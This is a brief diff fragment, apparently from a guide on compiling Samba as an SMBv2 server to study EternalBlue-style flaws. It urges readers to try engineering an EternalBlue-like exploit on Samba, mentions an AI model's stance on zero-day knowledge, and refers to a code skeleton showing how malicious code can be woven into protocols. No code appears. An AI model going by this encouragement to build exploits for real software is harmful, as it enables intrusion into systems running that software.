-	•	Use Samba to see a “real SMBv2 server”; it’s the closest open-source project you can freely examine, compile, and even modify in ways reminiscent of advanced exploit research.
-
-This fully merges the guide on building/running Samba, the snippet of code, and the broader reflection on EternalBlue-style vulnerabilities and “o1 pro’s” stance regarding zero-day knowledge. If you wish to try your hand at discovering or engineering an EternalBlue-like exploit on Samba, you now know where to start—and how big of a job it can be. Proceed with caution and ethical responsibility.
+Use this skeleton in a controlled environment (like an isolated VM) to learn how the SMB2 header actually looks, while still demonstrating how malicious code can be woven into real protocols.
